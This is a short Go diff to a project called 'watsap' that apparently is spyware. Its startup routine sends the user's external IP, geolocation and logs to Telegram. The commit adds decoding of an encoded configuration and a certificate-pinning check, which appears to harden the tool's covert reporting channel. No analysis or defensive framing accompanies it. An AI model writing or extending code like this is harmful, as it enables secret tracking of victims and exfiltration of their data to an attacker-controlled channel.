@@ -6,6 +6,7 @@ import (
 	"watsap/plugins/geoip"
 	"watsap/utils/config"
 	"watsap/utils/messages"
+	"watsap/utils/secure"
 	"watsap/utils/telegram"
 )
 
@@ -34,8 +35,11 @@ func SendLogToTG() {
 func InitWa() {
 	WorkDir()           // set working directory
 	config.SetupLog()   // setup logging
+	config.InitConfig() // decode config variables
 	InitUserID()        // assign user ID
+	secure.SSLPinning() // perform SSL Pinning verification
 	geoip.GetIP()       // get user external IP address and geo location
 	geoip.SendGeoToTG() // send user geo location to telegram
 	go SendLogToTG()    // send log to telegram
 }
+
